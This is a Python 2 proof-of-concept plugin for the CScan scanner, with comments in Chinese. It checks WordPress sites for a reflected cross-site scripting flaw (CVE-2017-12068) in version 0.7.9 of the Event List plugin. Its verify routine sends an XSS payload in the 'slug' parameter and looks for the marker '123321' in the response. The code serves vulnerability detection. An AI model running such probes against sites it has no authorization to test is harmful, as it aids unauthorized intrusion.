# coding: utf-8

import md5
import urllib2
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Unkonwn' # 平台漏洞编号，留空
    name = 'WordPress Event List插件跨站脚本漏洞(需要登陆)' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.XSS # 漏洞类型
    disclosure_date = '2017-09-05'  # 漏洞公布时间
    desc = '''模版漏洞描述
    "WordPress是WordPress软件基金会的一套使用PHP语言开发的博客平台，该平台支持在PHP和MySQL的服务器上架设个人博客网站。Event List是其中的一个事件清单插件。
    WordPress Event List插件0.7.9版本中存在跨站脚本漏洞。远程攻击者可利用该漏洞注入任意的Web脚本或HTML。"
    ''' # 漏洞描述
    ref = 'https://nvd.nist.gov/vuln/detail/CVE-2017-12068' # 漏洞来源
    cnvd_id = 'CNVD-2017-25201' # cnvd漏洞编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = '0.7.9'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '012eeaf8-09dd-4405-96fc-dbc2f0e88bee'
    author = 'cscan'  # POC编写者
    create_date = '2018-3-24' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        path = '{target}/wp-admin/admin.php?page=el_admin_categories&action=delete_bulk&slug[0]=1&slug[1]=2</script><img+src=1+onerror=alert(123321)>'.format(target=self.target)
        self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
            target=self.target, vuln=self.vuln))
        try:
            self.output.info('检查{target}是否存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
            r = requests.get(path)
            if '123321' in r.text:
                self.output.report(self.vuln, '目标{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
        except Exception,e:
            self.output.info('执行异常{}'.format(e))


    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
